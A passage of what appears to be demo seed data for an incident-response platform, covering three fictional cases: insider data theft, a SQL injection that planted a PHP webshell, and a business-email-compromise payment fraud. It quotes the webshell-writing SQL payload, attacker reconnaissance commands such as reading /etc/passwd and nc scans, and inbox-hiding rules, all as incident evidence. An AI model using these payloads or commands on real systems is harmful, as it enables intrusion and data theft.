    'title': 'Departing employee data exfiltration',
    'classification': 'information-content-security:Unauthorised-information-access',
    'severity': 'Medium',
    'state': 'Reporting',
    'tags': 'insider-threat,data-loss,hr-sensitive,demo',
    'description': """## Executive summary

A senior sales engineer who resigned on 2024-11-04 copied the contents of the
CRM export share and the product roadmap directory to a personal cloud account
and a USB mass-storage device during their notice period. No malware was
involved; every action used credentials and access the user legitimately held.

**Status:** investigation complete, report in review with HR and Legal.

## Impact

| Area | Assessment |
|---|---|
| Confidentiality | **Confirmed loss** — CRM export + roadmap directory |
| Integrity | Not affected |
| Availability | Not affected |
| Accounts | No compromise — legitimate access, illegitimate use |

## What was taken

- Full CRM contact export (≈ 18,400 records, includes contact emails)
- `Roadmap/FY25` directory (14 documents, marked Internal)
- Two pricing models from the `Pricing/Confidential` share

## Handling note

> This case contains HR-sensitive material. Access is restricted to the IR
> lead, HR business partner and Legal. Do not widen case access without
> sign-off from the HR business partner.
""",
    'assets': [
        ('LAPTOP-SE-11', 'Windows - Computer', '10.30.2.11', 'CORP', False),
        ('SRV-CRM-APP', 'Linux - Server', '10.30.0.40', 'CORP', False),
        ('SRV-FILE-05', 'Windows - Server', '10.30.0.15', 'CORP', False),
        ('PROXY-EGRESS', 'Firewall', '10.30.0.2', '', False),
        ('a.whitfield', 'Windows Account - AD', '', 'CORP', False),
    ],
    'iocs': [
        ('domain', 'personal-drive-sync.com', 'Personal cloud storage used for the upload'),
        ('ip-dst', '203.0.113.201', 'Egress endpoint for personal-drive-sync.com'),
        ('filename', 'crm_full_export_2024-11-07.csv', 'Full CRM contact export'),
        ('filename', 'FY25_Roadmap_Consolidated.pptx', 'Internal product roadmap deck'),
        ('filename', 'pricing_model_v9_CONFIDENTIAL.xlsx', 'Confidential pricing model'),
        ('email-dst', 'a.whitfield.personal@mailbox-provider.net',
         'Personal address used to send a copy of the roadmap'),
        ('other', 'USB\\VID_0781&PID_5583\\3F2A9C1B',
         'USB device serial recorded in SetupAPI logs'),
    ],
    'notes': [
        ('Initial Analysis', [
            ('Referral Summary',
             '## Referral Summary\n\n**Source:** HR business partner  \n'
             '**Referred:** 2024-11-12\n\n'
             'HR flagged unusual volume on the CRM export share by a user under notice. '
             'DLP had generated two low-severity alerts that were auto-closed by the '
             'weekend queue.\n\n'
             '**Sensitivity:** HR-restricted. See the handling note on the case summary.'),
            ('Access Legitimacy',
             '## Access Legitimacy\n\n'
             'Every file accessed was within the scope of the user\'s standing permissions. '
             'There is **no evidence of privilege escalation, credential theft or malware**.\n\n'
             'This is an acceptable-use and data-protection matter, not a security '
             'compromise. Framing matters for the report — recommend the '
             '`information-content-security` classification rather than `intrusion`.'),
        ]),
        ('Investigation', [
            ('Exfiltration Timeline',
             '## Exfiltration Timeline\n\n'
             '| When | Action | Destination |\n|---|---|---|\n'
             '| 11-07 18:42 | CRM full export generated | local disk |\n'
             '| 11-07 19:05 | Upload to personal-drive-sync.com | cloud |\n'
             '| 11-08 17:58 | Roadmap directory copied | USB 3F2A |\n'
             '| 11-09 12:20 | Pricing models copied | USB 3F2A |\n'
             '| 11-09 12:44 | Roadmap deck emailed to personal address | email |\n\n'
             'All activity falls inside the notice period (resigned 11-04, last day 11-29).'),
            ('USB Device Analysis',
             '## USB Device Analysis\n\n'
             'SetupAPI and registry artefacts on LAPTOP-SE-11 record a single SanDisk '
             'mass-storage device:\n\n'
             '```\nUSB\\VID_0781&PID_5583\\3F2A9C1B\n'
             'First connected : 2024-11-08 17:51\n'
             'Last connected  : 2024-11-09 12:51\n```\n\n'
             'Shellbag and LNK artefacts confirm the roadmap and pricing directories were '
             'browsed from the device path. **The device has not been recovered.**'),
            ('Proxy Evidence',
             '## Proxy Evidence\n\n'
             'Egress proxy logs show a 412 MB POST to personal-drive-sync.com '
             '(203.0.113.201) at 19:05 on 11-07, authenticated to the user\'s corporate '
             'session.\n\n'
             'The destination is categorised *Personal Storage* and is **allowed** by the '
             'current egress policy — this is a policy gap, not a control failure.'),
        ]),
        ('Reporting', [
            ('Findings for HR and Legal',
             '## Findings for HR and Legal\n\n'
             '**Established with high confidence:**\n\n'
             '1. The user copied CRM, roadmap and pricing material to a personal cloud '
             'account and a USB device during the notice period.\n'
             '2. All access used legitimate, in-scope permissions.\n'
             '3. One roadmap document was emailed to a personal address.\n\n'
             '**Not established:**\n\n'
             '- Whether the material has been shared with any third party\n'
             '- Whether the USB device still exists\n\n'
             '**Recommended next steps:** legal hold on the user\'s mailbox and endpoint; '
             'request return of the USB device as part of the exit process.'),
            ('Control Gaps',
             '## Control Gaps\n\n'
             '1. Personal cloud storage is permitted by egress policy with no volume '
             'threshold.\n'
             '2. USB mass storage is unrestricted on engineering laptops.\n'
             '3. DLP alerts for users under notice carry no severity uplift — both alerts '
             'here were auto-closed by the weekend queue.\n\n'
             'Item 3 is the cheapest and highest-value fix: pipe HR leaver status into the '
             'DLP severity calculation.'),
        ]),
    ],
    'timeline': [
        (0, 'Resignation recorded in HR system',
         'User a.whitfield submits resignation. Last working day set to 2024-11-29. No '
         'access change is triggered by the HR workflow.',
         'UEBA', '#1E90FF', 'Unspecified', False, True,
         ['a.whitfield'], []),
        (4302, 'Full CRM export generated',
         'a.whitfield ran a full contact export from the CRM application — approximately '
         '18,400 records including contact email addresses.',
         'Cloud Security', '#FFD700', 'Collection', True, True,
         ['SRV-CRM-APP', 'a.whitfield'], ['crm_full_export_2024-11-07.csv']),
        (4325, 'Upload to personal cloud storage',
         '412 MB HTTPS POST to personal-drive-sync.com from the user corporate session. '
         'Destination is categorised Personal Storage and permitted by egress policy.',
         'Proxy', '#FF8C00', 'Exfiltration', True, True,
         ['LAPTOP-SE-11', 'PROXY-EGRESS', 'a.whitfield'],
         ['personal-drive-sync.com', '203.0.113.201', 'crm_full_export_2024-11-07.csv']),
        (5718, 'USB mass storage device connected',
         'SanDisk device 3F2A9C1B connected to LAPTOP-SE-11 for the first time.',
         'EDR', '#FFD700', 'Collection', True, True,
         ['LAPTOP-SE-11'], ['USB\\VID_0781&PID_5583\\3F2A9C1B']),
        (5725, 'Roadmap directory copied to USB',
         'Roadmap/FY25 directory (14 documents) copied from SRV-FILE-05 to the USB device. '
         'Confirmed by LNK and shellbag artefacts.',
         'EDR', '#FF8C00', 'Exfiltration', True, True,
         ['LAPTOP-SE-11', 'SRV-FILE-05'],
         ['FY25_Roadmap_Consolidated.pptx']),
        (7000, 'Pricing models copied to USB',
         'Two files from the Pricing/Confidential share copied to the same USB device.',
         'EDR', '#FF8C00', 'Exfiltration', True, True,
         ['LAPTOP-SE-11', 'SRV-FILE-05'],
         ['pricing_model_v9_CONFIDENTIAL.xlsx']),
        (7024, 'Roadmap deck emailed to personal address',
         'FY25_Roadmap_Consolidated.pptx sent from the corporate mailbox to '
         'a.whitfield.personal@mailbox-provider.net.',
         'Email Gateway', '#FF4500', 'Exfiltration', True, True,
         ['a.whitfield'],
         ['a.whitfield.personal@mailbox-provider.net', 'FY25_Roadmap_Consolidated.pptx']),
        (11520, 'HR referral to security',
         'HR business partner refers the case to the security team after noticing export '
         'volume on the CRM share.',
         'UEBA', '#1E90FF', 'Unspecified', False, True,
         ['a.whitfield'], []),
        (11700, 'Endpoint preserved',
         'LAPTOP-SE-11 imaged and placed under legal hold. Mailbox export taken.',
         'SIEM', '#32CD32', 'Remediation', False, True,
         ['LAPTOP-SE-11'], []),
    ],
    'tasks': [
        ('Image LAPTOP-SE-11 under legal hold',
         'Full disk image with chain of custody documentation for potential legal use.',
         'Done', 'forensics'),
        ('Export and preserve mailbox',
         'Preserve the corporate mailbox including sent items before the account is '
         'deprovisioned.', 'Done', 'forensics'),
        ('Enumerate every file copied to USB 3F2A',
         'Reconstruct the complete file list from LNK, shellbag and jumplist artefacts.',
         'Done', 'forensics'),
        ('Request return of the USB device',
         'Coordinate with HR to make device return part of the exit process.',
         'In progress', 'hr'),
        ('Brief Legal on notification exposure',
         'CRM export contains contact email addresses — assess whether this triggers any '
         'data-protection notification obligation.', 'In progress', 'legal'),
        ('Propose DLP severity uplift for leavers',
         'Feed HR leaver status into DLP severity so notice-period alerts do not get '
         'auto-closed by the weekend queue.', 'To do', 'hardening'),
    ],
    'evidence': [
        ('LAPTOP-SE-11.E01', 'HDD image - E01 - Windows',
         'Full disk image of the departing user laptop, acquired under legal hold.',
         512110190592, '5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d'),
        ('a.whitfield-mailbox.pst', 'Mailbox export',
         'Corporate mailbox export including sent items, taken before deprovisioning.',
         6442450944, '6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e'),
        ('egress-proxy-nov07.log', 'Log file',
         'Egress proxy logs for 2024-11-07 filtered to the user session.',
         15728640, '708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f'),
        ('setupapi.dev.log', 'Log file',
         'USB device installation log recovered from LAPTOP-SE-11.',
         4194304, '8192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70'),
    ],
    'alerts': [
        ('Large upload to personal cloud storage', 'Proxy', 'Medium', 'Escalated', None,
         4325, ['LAPTOP-SE-11', 'a.whitfield'], ['personal-drive-sync.com', '203.0.113.201']),
        ('Bulk CRM record export by single user', 'Cloud Security', 'Medium', 'Escalated', None,
         4302, ['SRV-CRM-APP', 'a.whitfield'], ['crm_full_export_2024-11-07.csv']),
        ('USB mass storage device connected', 'EDR', 'Low', 'Closed',
         'True Positive With Impact', 5718, ['LAPTOP-SE-11'],
         ['USB\\VID_0781&PID_5583\\3F2A9C1B']),
        ('Confidential document sent to external address', 'Email Gateway', 'Medium',
         'Escalated', None, 7024, ['a.whitfield'],
         ['a.whitfield.personal@mailbox-provider.net']),
        ('Anomalous file share access volume', 'UEBA', 'Low', 'Closed',
         'True Positive With Impact', 5725, ['SRV-FILE-05', 'a.whitfield'], []),
        ('Access to confidential pricing share', 'SIEM', 'Informational', 'Closed',
         'Legitimate', 7000, ['SRV-FILE-05'], ['pricing_model_v9_CONFIDENTIAL.xlsx']),
    ],
    'war_room': ('Insider data loss — HR restricted', 'standby', 'Medium',
                 'Restricted coordination room. HR-sensitive: membership is limited to the '
                 'IR lead, HR business partner and Legal.'),
    'chat': [
        (0, 'Reminder before we start: this room is HR-restricted. Do not forward anything '
            'from here and do not widen case access without the HR business partner.'),
        (1, 'Understood. Imaging is complete and the mailbox export is preserved. Both are '
            'under legal hold.'),
        (2, 'USB artefact work is finished — single SanDisk device, connected twice, roadmap '
            'and pricing directories both browsed from it. Device itself is still missing.'),
        (0, 'Important framing point for the report: every access was within the user\'s '
            'legitimate permissions. This is acceptable-use, not intrusion.'),
        (1, 'Agreed, and worth calling out that the two DLP alerts were auto-closed by the '
            'weekend queue. That is the control gap worth fixing.'),
        (0, 'Yes — I want that as a named recommendation, not a footnote.'),
    ],
    'comments': [
        ('asset', 'a.whitfield',
         'No account compromise. All access was legitimate and in-scope — the issue is use, '
         'not authorisation.'),
        ('ioc', 'personal-drive-sync.com',
         'Categorised Personal Storage and currently permitted by egress policy. Policy gap '
         'rather than a control failure.'),
        ('task', 'Propose DLP severity uplift for leavers',
         'Cheapest and highest-value recommendation from this case — both DLP alerts here '
         'were auto-closed purely because of when they fired.'),
    ],
}

_WEBAPP_COMPROMISE = {
    'key': 'webapp-compromise',
    'title': 'SQL injection to webshell on public portal',
    'classification': 'intrusion:application-compromise',
    'severity': 'High',
    'state': 'Post-Incident',
    'tags': 'sqli,webshell,public-facing,pci-adjacent,demo',
    'description': """## Executive summary

An unauthenticated SQL injection flaw in the customer portal's order-search
endpoint was exploited to read the application database and then to write a
PHP webshell to the document root. The actor used the webshell for
approximately six hours before the host was taken out of the load-balancer
pool and rebuilt.

**Status:** post-incident. Patch is deployed; report is drafted.

## Impact

| Area | Assessment |
|---|---|
| Confidentiality | **Confirmed loss** — customer order table read |
| Integrity | Webshell written to document root; no data modification found |
| Availability | 40 minutes degraded while the node was pulled |
| Cardholder data | **Not in scope** — tokenised, no PAN in this database |

## Attack path

1. **Initial access** — union-based SQLi in `/api/orders/search?q=`
2. **Discovery** — schema enumeration, then bulk read of `orders`
3. **Persistence** — `INTO OUTFILE` writes `status_check.php` to the web root
4. **Execution** — command execution as the `www-data` service account
5. **Discovery** — internal network scan attempted from the DMZ host

Lateral movement into the internal network **failed** — the DMZ segmentation
policy blocked every attempted connection to 10.40.1.0/24.

## Outstanding actions

- [x] Patch the vulnerable endpoint (parameterised query)
- [x] Rebuild SRV-WEB-PROD from the golden image
- [ ] Complete the customer notification assessment
""",
    'assets': [
        ('SRV-WEB-PROD', 'Linux - Server', '10.40.2.5', 'DMZ', True),
        ('SRV-DB-MYSQL', 'Linux - Server', '10.40.2.8', 'DMZ', True),
        ('LB-EDGE-01', 'Firewall', '10.40.2.1', 'DMZ', False),
        ('SRV-APP-INTERNAL', 'Linux - Server', '10.40.1.20', 'CORP', False),
        ('www-data', 'Linux Account', '', 'DMZ', True),
        ('portal_db_user', 'Linux Account', '', 'DMZ', True),
    ],
    'iocs': [
        ('ip-src', '198.51.100.77', 'Source IP of the SQL injection and webshell traffic'),
        ('ip-src', '198.51.100.91', 'Second source IP used after the first was blocked'),
        ('url', 'https://portal.example.com/api/orders/search?q=1%27%20UNION%20SELECT',
         'Union-based SQL injection request'),
        ('filename', 'status_check.php', 'PHP webshell written to the document root'),
        ('sha256', '7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e',
         'Hash of the webshell'),
        ('user-agent', 'sqlmap/1.7.2#stable (https://sqlmap.org)',
         'Automated injection tooling user-agent'),
        ('other', 'portal_db_user', 'Database account used by the vulnerable endpoint'),
    ],
    'notes': [
        ('Initial Analysis', [
            ('Triage Summary',
             '## Triage Summary\n\n**Analyst:** Web IR\n\n'
             'WAF logged a burst of union-based injection attempts against '
             '`/api/orders/search`. The endpoint concatenates the `q` parameter directly '
             'into the query — no parameterisation.\n\n'
             'A webshell was subsequently written to the document root via `INTO OUTFILE`, '
             'which succeeded because the MySQL account held `FILE` privilege and '
             '`secure_file_priv` was unset.\n\n'
             '**Priority:** High  \n**Public-facing:** Yes'),
            ('Cardholder Data Scoping',
             '## Cardholder Data Scoping\n\n'
             'The `orders` table stores **tokenised** payment references only. No PAN, '
             'no CVV, no expiry data is present in this database.\n\n'
             'Confirmed by schema review and by sampling 500 rows of the recovered dump. '
             '**This incident is not in PCI scope**, though customer contact details were '
             'exposed and may carry separate notification obligations.'),
        ]),
        ('Investigation', [
            ('Injection Analysis',
             '## Injection Analysis\n\n'
             'The vulnerable parameter is `q` on `/api/orders/search`:\n\n'
             '```sql\nSELECT id, ref, customer_email, total\n'
             'FROM orders\nWHERE ref LIKE \'%\' + $q + \'%\'\n```\n\n'
             'The actor used sqlmap (identifiable by user-agent) for schema enumeration, '
             'then switched to hand-crafted requests for the bulk read — likely to reduce '
             'request volume after the WAF began rate-limiting.\n\n'
             '**Rows read:** approximately 61,000 from `orders`.'),
            ('Webshell Activity',
             '## Webshell Activity\n\n'
             'File written via:\n\n'
             '```sql\n... UNION SELECT \'<?php system($_GET["c"]); ?>\'\n'
             'INTO OUTFILE \'/var/www/html/status_check.php\'\n```\n\n'
             'Access log shows 340 requests to `status_check.php` over roughly six hours '
             'from 198.51.100.77 and later 198.51.100.91.\n\n'
             'Commands recovered from the log query strings include `id`, `uname -a`, '
             '`cat /etc/passwd`, and a series of `nc -zv 10.40.1.x` scans.'),
            ('Containment of Lateral Movement',
             '## Containment of Lateral Movement\n\n'
             'Every attempted connection from SRV-WEB-PROD to 10.40.1.0/24 was **denied** '
             'by the DMZ egress policy. Firewall logs show 118 denied SYNs across the scan '
             'window.\n\n'
             '> The segmentation policy is the single control that kept this incident '
             '> confined to the DMZ. Worth calling out as a success in the report.'),
        ]),
        ('Post-Incident', [
            ('Remediation Summary',
             '## Remediation Summary\n\n'
             '- [x] Pulled SRV-WEB-PROD from the load-balancer pool\n'
             '- [x] Rebuilt the host from the golden image\n'
             '- [x] Deployed the parameterised-query patch to the orders endpoint\n'
             '- [x] Revoked `FILE` privilege from `portal_db_user` and set '
             '`secure_file_priv`\n'
             '- [x] Rotated all portal database credentials\n'
             '- [ ] Complete the customer notification assessment\n\n'
             '**Time to containment:** 6h 12m from first injection attempt.'),
            ('Lessons Learned',
             '## Lessons Learned\n\n'
             '1. The endpoint predates the ORM migration and was never re-reviewed — audit '
             'for other raw-SQL endpoints.\n'
             '2. `portal_db_user` held `FILE` privilege it never needed. Least privilege on '
             'service DB accounts would have blocked the webshell write entirely.\n'
             '3. The WAF detected and logged the injection but was in monitor-only mode for '
             'this route. Moving it to block would have cut dwell time substantially.\n'
             '4. DMZ segmentation worked exactly as designed — keep it.'),
        ]),
    ],
    'timeline': [
        (0, 'First injection attempts logged by WAF',
         'Burst of union-based SQL injection attempts against /api/orders/search from '
         '198.51.100.77. WAF is in monitor-only mode for this route.',
         'IDS/IPS', '#FFD700', 'Initial Access', True, True,
         ['SRV-WEB-PROD', 'LB-EDGE-01'],
         ['198.51.100.77', 'sqlmap/1.7.2#stable (https://sqlmap.org)']),
        (18, 'Database schema enumerated',
         'Automated tooling enumerated table and column names from information_schema.',
         'IDS/IPS', '#FF8C00', 'Discovery', True, True,
         ['SRV-DB-MYSQL', 'portal_db_user'],
         ['https://portal.example.com/api/orders/search?q=1%27%20UNION%20SELECT']),
        (52, 'Bulk read of orders table',
         'Approximately 61,000 rows read from the orders table, including customer email '
         'addresses. Request pattern switches from sqlmap to hand-crafted requests.',
         'IDS/IPS', '#FF4500', 'Collection', True, True,
         ['SRV-DB-MYSQL', 'portal_db_user'], ['198.51.100.77']),
        (97, 'Webshell written to document root',
         'INTO OUTFILE used to write status_check.php to /var/www/html/. Succeeded because '
         'portal_db_user held FILE privilege and secure_file_priv was unset.',
         'EDR', '#FF0000', 'Persistence', True, True,
         ['SRV-WEB-PROD', 'SRV-DB-MYSQL'],
         ['status_check.php',
          '7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e']),
        (103, 'Command execution via webshell',
         'First commands executed as www-data: id, uname -a, cat /etc/passwd.',
         'EDR', '#FF0000', 'Execution', True, True,
         ['SRV-WEB-PROD', 'www-data'], ['status_check.php']),
        (141, 'Internal network scan attempted',
         'Series of nc -zv probes from SRV-WEB-PROD toward 10.40.1.0/24. All 118 attempts '
         'denied by the DMZ egress policy.',
         'Firewall', '#FF4500', 'Discovery', True, True,
         ['SRV-WEB-PROD', 'SRV-APP-INTERNAL', 'LB-EDGE-01'], []),
        (205, 'Source IP blocked, actor rotates',
         '198.51.100.77 blocked at the edge. Webshell access resumes from 198.51.100.91 '
         'within four minutes.',
         'Firewall', '#FF8C00', 'Defense Evasion', True, True,
         ['LB-EDGE-01'], ['198.51.100.91']),
        (350, 'Webshell discovered',
         'File-integrity monitoring flags status_check.php as an unexpected file in the '
         'document root. Incident escalated.',
         'EDR', '#1E90FF', 'Unspecified', False, True,
         ['SRV-WEB-PROD'], ['status_check.php']),
        (372, 'Node pulled from load balancer',
         'SRV-WEB-PROD removed from the LB pool. Service degraded but available on the '
         'remaining nodes.',
         'Firewall', '#32CD32', 'Remediation', False, True,
         ['SRV-WEB-PROD', 'LB-EDGE-01'], []),
        (455, 'Host rebuilt and patch deployed',
         'SRV-WEB-PROD rebuilt from the golden image. Parameterised-query patch deployed '
         'and FILE privilege revoked from portal_db_user.',
         'EDR', '#32CD32', 'Remediation', False, True,
         ['SRV-WEB-PROD', 'portal_db_user'], []),
    ],
    'tasks': [
        ('Pull SRV-WEB-PROD from the LB pool',
         'Remove the compromised node from rotation while preserving it for imaging.',
         'Done', 'containment'),
        ('Patch the orders search endpoint',
         'Replace string concatenation with a parameterised query and add input validation.',
         'Done', 'eradication'),
        ('Revoke FILE privilege from portal_db_user',
         'Apply least privilege to the application database account and set secure_file_priv.',
         'Done', 'hardening'),
        ('Rotate all portal database credentials',
         'Rotate credentials for every account reachable from the compromised host.',
         'Done', 'eradication'),
        ('Audit for other raw-SQL endpoints',
         'The vulnerable route predates the ORM migration. Review the full route table for '
         'siblings that were also never migrated.', 'In progress', 'hardening'),
        ('Move WAF to block mode for API routes',
         'The WAF detected the injection but only logged it. Move API routes from monitor '
         'to block.', 'In progress', 'hardening'),
        ('Complete customer notification assessment',
         'Roughly 61,000 customer email addresses were exposed. Work with Legal on '
         'notification obligations.', 'To do', 'legal'),
    ],
    'evidence': [
        ('SRV-WEB-PROD-disk.dd', 'HDD image - DD - Unix',
         'Disk image of the compromised web node taken before rebuild.',
         107374182400, '91a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80'),
        ('access.log', 'Log file',
         'Full nginx access log covering the intrusion window.',
         268435456, 'a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091'),
        ('waf-events.json', 'Log file',
         'WAF event export showing detected but unblocked injection attempts.',
         52428800, 'b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2'),
        ('status_check.php', 'Malware sample',
         'Recovered PHP webshell as written to the document root.',
         64, '7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e'),
        ('mysql-general.log', 'Log file',
         'MySQL general query log capturing the INTO OUTFILE write.',
         134217728, 'c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3'),
    ],
    'alerts': [
        ('SQL injection attempt on web application', 'IDS/IPS', 'High', 'Escalated', None,
         0, ['SRV-WEB-PROD'], ['198.51.100.77']),
        ('Automated scanning tool detected', 'IDS/IPS', 'Medium', 'Closed',
         'True Positive With Impact', 18, ['SRV-WEB-PROD'],
         ['sqlmap/1.7.2#stable (https://sqlmap.org)']),
        ('Anomalous database read volume', 'SIEM', 'High', 'Escalated', None,
         52, ['SRV-DB-MYSQL', 'portal_db_user'], []),
        ('Unexpected file created in web root', 'EDR', 'Critical', 'Escalated', None,
         97, ['SRV-WEB-PROD'], ['status_check.php']),
        ('Web server spawned shell process', 'EDR', 'Critical', 'Escalated', None,
         103, ['SRV-WEB-PROD', 'www-data'], ['status_check.php']),
        ('Blocked internal scan from DMZ host', 'Firewall', 'High', 'Escalated', None,
         141, ['SRV-WEB-PROD', 'SRV-APP-INTERNAL'], []),
        ('Connection from newly observed source IP', 'Firewall', 'Low', 'New', None,
         205, ['LB-EDGE-01'], ['198.51.100.91']),
    ],
    'war_room': ('Portal compromise — webshell on SRV-WEB-PROD', 'closed', 'High',
                 'Response room for the public portal compromise. Closed — host rebuilt, '
                 'patch deployed, report in review.'),
    'chat': [
        (0, 'Node is out of the LB pool and imaged. Webshell is confirmed at '
            '/var/www/html/status_check.php.'),
        (1, 'Access log parsed: 340 requests to the shell over about six hours, two source '
            'IPs. Commands were recon plus an internal scan attempt.'),
        (2, 'Good news on the scan — all 118 attempts to 10.40.1.0/24 were denied by the DMZ '
            'policy. Nothing reached the internal segment.'),
        (0, 'That is the headline for the report. Segmentation did its job.'),
        (1, 'Confirmed the orders table has no PAN — tokenised references only. We are out of '
            'PCI scope, but ~61k customer emails were read.'),
        (0, 'Then the open question is notification. Handing that to Legal with the row count '
            'and the sampling methodology.'),
        (2, 'Patch is live and FILE privilege is revoked from portal_db_user. That combination '
            'closes the write path even if another SQLi shows up.'),
    ],
    'comments': [
        ('asset', 'SRV-WEB-PROD',
         'Rebuilt from the golden image rather than cleaned — webshell persistence on a '
         'public-facing node is not worth the residual risk.'),
        ('asset', 'portal_db_user',
         'Held FILE privilege it never needed. Removing it is what actually closes the '
         'webshell write path.'),
        ('ioc', 'status_check.php',
         'Trivial one-liner shell. Detection came from file-integrity monitoring, not AV — '
         'worth noting in the report.'),
        ('ioc', '198.51.100.91',
         'Second source IP. Actor rotated within four minutes of the first block, so '
         'IP blocking alone was never going to be sufficient.'),
        ('task', 'Audit for other raw-SQL endpoints',
         'Highest-value follow-up. If this route was missed by the ORM migration, others '
         'almost certainly were too.'),
    ],
}

_BEC = {
    'key': 'bec',
    'title': 'Business email compromise and payment diversion',
    'classification': 'fraud:masquerade',
    'severity': 'High',
    'state': 'Closed',
    'tags': 'bec,oauth-abuse,payment-fraud,mfa-bypass,demo',
    'description': """## Executive summary

An adversary-in-the-middle phishing kit harvested a Finance controller's
credentials **and** session token, bypassing MFA. The actor registered their
own authenticator, created inbox rules to hide replies, and used the mailbox
to redirect a supplier payment of EUR 184,000 to an attacker-controlled
account.

**Status:** closed. Funds were recalled successfully; the account is
remediated and the control gaps are fixed.

## Impact

| Area | Assessment |
|---|---|
| Confidentiality | Mailbox contents exposed for ~5 days |
| Integrity | Inbox rules created; one invoice altered |
| Financial | **EUR 184,000 diverted — fully recovered** |
| Accounts | `m.laurent` compromised, now remediated |

## Attack path

1. **Initial access** — AiTM phishing page proxied the real login, capturing
   the session token after a successful MFA challenge
2. **Persistence** — attacker enrolled a second authenticator; created inbox
   rules moving supplier replies to `RSS Feeds`
3. **Collection** — mailbox searched for `invoice`, `IBAN`, `payment`
4. **Impact** — altered invoice sent from the legitimate mailbox, diverting
   a EUR 184,000 supplier payment

## Outcome

The bank recall succeeded within 31 hours because the finance team's
out-of-band verification callback caught the change on the *second* payment
request. The first payment was already recalled.
""",
    'assets': [
        ('LAPTOP-FIN-04', 'Windows - Computer', '10.50.1.4', 'CORP', True),
        ('M365-TENANT', 'Account', '', 'CORP', True),
        ('m.laurent', 'Account', '', 'CORP', True),
        ('t.okafor', 'Account', '', 'CORP', False),
        ('MAIL-GATEWAY', 'Linux - Server', '10.50.0.25', 'CORP', False),
    ],
    'iocs': [
        ('domain', 'login-microsftonline-secure.com', 'AiTM phishing domain proxying the real login'),
        ('url', 'https://login-microsftonline-secure.com/auth/verify?id=8823',
         'Phishing link delivered in the lure email'),
        ('ip-src', '203.0.113.155', 'Attacker source IP for mailbox sign-ins'),
        ('ip-src', '198.51.100.240', 'Second attacker source IP, different ASN'),
        ('email-src', 'no-reply@docusign-review-portal.com', 'Lure email sender'),
        ('email-dst', 'accounts@supplier-payments-eu.net', 'Attacker reply-to for the altered invoice'),
        ('other', 'RSS Feeds', 'Target folder for the malicious inbox rule'),
        ('other', 'DE89 3704 0044 0532 0130 00', 'Attacker-controlled IBAN on the altered invoice'),
        ('user-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
                       'Chrome/119.0.0.0 Safari/537.36',
         'User-agent used by the attacker sessions, inconsistent with the user device'),
    ],
    'notes': [
        ('Initial Analysis', [
            ('Triage Summary',
             '## Triage Summary\n\n**Analyst:** Cloud IR\n\n'
             'Finance reported a supplier querying a payment they never received. '
             'Investigation showed the payment was sent to an IBAN supplied in an invoice '
             'sent **from the controller\'s real mailbox**.\n\n'
             'Sign-in logs show the mailbox was accessed from two IPs in unrelated ASNs '
             'starting five days before the fraudulent invoice.\n\n'
             '**Priority:** High  \n**Financial exposure:** EUR 184,000'),
            ('MFA Bypass Mechanism',
             '## MFA Bypass Mechanism\n\n'
             'This was **not** an MFA failure in the sense of a weak factor. The phishing '
             'kit proxied the genuine Microsoft login page in real time:\n\n'
             '1. User entered credentials on the attacker page\n'
             '2. Attacker relayed them to the real login\n'
             '3. Real login issued an MFA challenge, which the user completed\n'
             '4. Attacker captured the resulting **session token**\n\n'
             'The token was then replayed. No second factor was required because the '
             'session was already authenticated.\n\n'
             '> Token-theft-resistant methods (FIDO2 / passkeys, or token binding) are the '
             '> control that defeats this. Push MFA does not.'),
        ]),
        ('Investigation', [
            ('Attacker Session Analysis',
             '## Attacker Session Analysis\n\n'
             '| When | Source IP | ASN | Action |\n|---|---|---|---|\n'
             '| Day 0 14:22 | 203.0.113.155 | AS64512 | First token replay |\n'
             '| Day 0 14:31 | 203.0.113.155 | AS64512 | Authenticator enrolled |\n'
             '| Day 0 14:48 | 203.0.113.155 | AS64512 | Inbox rules created |\n'
             '| Day 1–4 | both | mixed | Mailbox searches |\n'
             '| Day 5 09:12 | 198.51.100.240 | AS64513 | Fraudulent invoice sent |\n\n'
             'The user-agent on every attacker session is a Linux Chrome build. '
             '`m.laurent` uses a Windows laptop exclusively — this alone would have been '
             'a reliable detection signal.'),
            ('Inbox Rules',
             '## Inbox Rules\n\n'
             'Two rules were created on Day 0 at 14:48:\n\n'
             '```\nRule 1: if subject contains "invoice" OR "payment"\n'
             '        AND from contains "supplier-"\n'
             '        then move to "RSS Feeds", mark as read\n\n'
             'Rule 2: if from contains "@ourcompany.example"\n'
             '        AND body contains "IBAN"\n'
             '        then move to "RSS Feeds", mark as read\n```\n\n'
             'The purpose was to keep both the supplier\'s queries and any internal '
             'verification traffic out of the user\'s view. This is why the compromise '
             'ran for five days without the user noticing anything.'),
            ('Financial Trace',
             '## Financial Trace\n\n'
             '**Payment 1:** EUR 184,000 issued Day 5 16:40 to '
             '`DE89 3704 0044 0532 0130 00`.\n\n'
             '**Payment 2:** EUR 97,500 requested Day 6 — **blocked**. The finance team\'s '
             'out-of-band callback procedure caught the changed IBAN on this one.\n\n'
             'Recall on payment 1 was initiated Day 6 11:05 and confirmed Day 7 18:20. '
             '**Full amount recovered.**'),
        ]),
        ('Closure', [
            ('Remediation Summary',
             '## Remediation Summary\n\n'
             '- [x] Revoked all sessions and refresh tokens for m.laurent\n'
             '- [x] Removed the attacker-enrolled authenticator\n'
             '- [x] Deleted both malicious inbox rules\n'
             '- [x] Reset credentials and re-enrolled the user\n'
             '- [x] Blocked the phishing domain at the mail gateway and proxy\n'
